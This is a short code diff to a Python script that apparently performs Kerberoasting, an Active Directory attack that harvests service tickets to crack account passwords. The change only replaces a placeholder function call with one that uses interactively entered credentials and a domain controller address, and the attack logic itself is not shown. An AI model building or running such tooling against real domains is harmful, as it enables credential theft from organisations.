@@ -45,9 +45,8 @@ def kerberoast_kerberoastable_users(username, password, domain, dc_ip):
 
     except Exception as e:
         print(f"Error during Kerberoasting: {e}")
-        
+
 # Replace "username", "password", "domain", and "dc_ip" with your actual credentials and domain controller's IP address
-kerberoast_kerberoastable_users("username", "password", "domain", "dc_ip")
 
 
 # Example usage:
@@ -56,3 +55,5 @@ username = input("Enter username: ")
 password = input("Enter password: ")
 domain = input("Enter domain: ")
 dc_ip = input("Enter domain controller IP or hostname: ")
+
+kerberoast_kerberoastable_users(username, password, domain, dc_ip)
